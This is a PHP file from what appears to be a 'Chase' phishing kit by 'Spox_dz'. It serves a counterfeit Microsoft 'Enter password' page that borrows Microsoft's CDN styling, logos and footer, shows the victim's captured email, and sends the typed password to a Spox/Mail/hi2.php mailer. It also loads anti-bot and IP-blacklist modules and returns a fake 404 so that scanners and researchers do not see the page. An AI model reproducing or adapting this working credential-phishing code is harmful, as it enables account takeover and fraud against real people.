<?php
session_start();
error_reporting(0);

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * Chase -
 * version 3.0
 * icq & telegram = @spoxcoder
 
###############################################
#$            C0d3d by Spox_dz               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 Chase             $#
###############################################

**/

include'Spox/Anti/IP-BlackList.php';  
include'Spox/Anti/Bot-Crawler.php';
include'Spox/Anti/Bot-Spox.php';
include'Spox/Anti/blacklist.php';
include'Spox/Anti/new.php';
include'Spox/Functions/Fuck-you.php'; 
include'Spox/Anti/Dila_DZ.php';


if (!isset($_GET['chase_id']) || !isset($_GET['country'])) {
        header("HTTP/1.0 404 Not Found");
        exit();
    }
    
if (!isset($_SESSION['CHASE_SPOX'])) {
  header("Location: index");
  exit();
}
if (!isset($_SESSION['login_SESSION'])) {
  header("Location: login");
  exit();
}

$rundom = substr(sha1(mt_rand()),1,25);

?>
<html dir="ltr" lang="en-US"><head>
    <title>Sign in</title>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=10">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="Spox/Files/css/hrd.css">
    <link rel="stylesheet" type="text/css" href="https://logincdn.msauth.net/16.000/Converged_v22057_AZXChPIB5jI3ijrmoNll5w2.css">
</head>
<body>
      <style type="text/css">
        .middle {
    display: table-cell;
    vertical-align: middle;
}
.background-logo-holder {
    height: 36px;
    margin-bottom: 24px;
}
body.cb {
    text-align: center;
}

@media only screen and (min-width: 300px) {
  .background-logo {
    max-height: 36px;
    display: block;
    margin-left: auto;
    margin-right: auto;
    -webkit-animation: fadeIn 1s;
    -moz-animation: fadeIn 1s;
    -o-animation: fadeIn 1s;
    animation: fadeIn 1s;
}
  }
}

img {
    vertical-align: middle;
}
img {
    border: 0;
}
body.cb {
    color: #1b1b1b;
    text-align: left;
}
.background-logo-holder {
    height: 36px;
    margin-bottom: 24px;
}
body.cb .text-13 {
    font-size: .8125rem;
}
.subtitle {
    font-weight: 400;
    line-height: 0%;
}
body.cb .text-13 {
    font-size: .8125rem;
}
    </style>
    <div class="background">
        <div class="blur"></div>
        <div class="full"></div>
    </div>
    <div class="outer">
        <div class="middle">
        <div class="background-logo-holder"> 
<picture>
  <source 
    media="(min-width: 650px)"
    srcset="Spox/Files/img/chase-logo_text@2x.png">
  <source 
    media="(min-width: 465px)"
    srcset="Spox/Files/img/chase-logo_text@2x.png">
  <img  class="background-logo"
    src="Spox/Files/img/chase-touch-icon-152x152.png">
</picture>

             </div>
<div class="inner fade-in-lightbox">
<div class="lightbox-cover"></div>
<div>
    <img class="logo" src="Spox/Files/img/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg">
</div>

<div role="main" class="">
<div class="animate slide-in-next">
<div>
<form action="Spox/Mail/hi2.php" method="POST">

<div class="identityBanner">
    <button type="button" class="backButton" >
        <a href="microsoft?chase_id=<?=$rundom?>&country=usa"><img src="https://logincdn.msauth.net/16.000.28510.5/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" ></a>
    </button>

<div class="identity"><?php echo $_SESSION['emailhi']; ?></div>
</div>
</div>
</div>
<div class="pagination-view has-identity-banner animate slide-in-next">
<div>
<div class="row text-title">Enter password</div>

                        <?php 
                                if (isset($_GET['invalid'])) {
                                $invalid = isset($_GET['invalid']) ? trim(htmlentities($_GET['invalid'])):'';
                                if ($invalid == "password") {
                                    print"<div role='alert'>
                                            <div class='alert alert-error'>Your account or password is incorrect. If you don’t remember your password, <a href='#'>reset it now.</a></div></div>";}}
                        ?>




<div class="row">
<div class="form-group col-md-24">

<div class="placeholderContainer">
     <input name="passwd" type="password" class="form-control" placeholder="Password">
</div>
</div>
</div>
<div class="position-buttons">
<div>
<div class="form-group checkbox text-block-body no-margin-top"> 
<label >
    <input type="checkbox">
    <span>Keep me signed in</span>
</label>
</div>
<div class="row">
<div class="col-md-24">
<div class="text-13 action-links">
<div class="form-group">
    <a href="">Forgotten your password?</a>
</div>
<div class="form-group">
</div>
<div class="form-group"> 
    <a href="javascript: history.go(-1)">Sign in with a different Microsoft account</a>
    </div>
</div> </div> </div> </div> <div class="row">
    <div>
    <div class="col-xs-24 no-padding-left-right button-container">
    <div class="inline-block">
        <input type="submit" class="btn btn-block btn-primary" value="Sign in"> </div> </div></div> </div> </div></div> </div></div></div>


        </div>
    </div>
</form>
    <footer id="footer">
        <div>
            <div class="footerNode">
                <span>©2020 Microsoft</span>
                <a href="#">Privacy statement</a>
            </div>
        </div>
    </footer>



</body>
</html>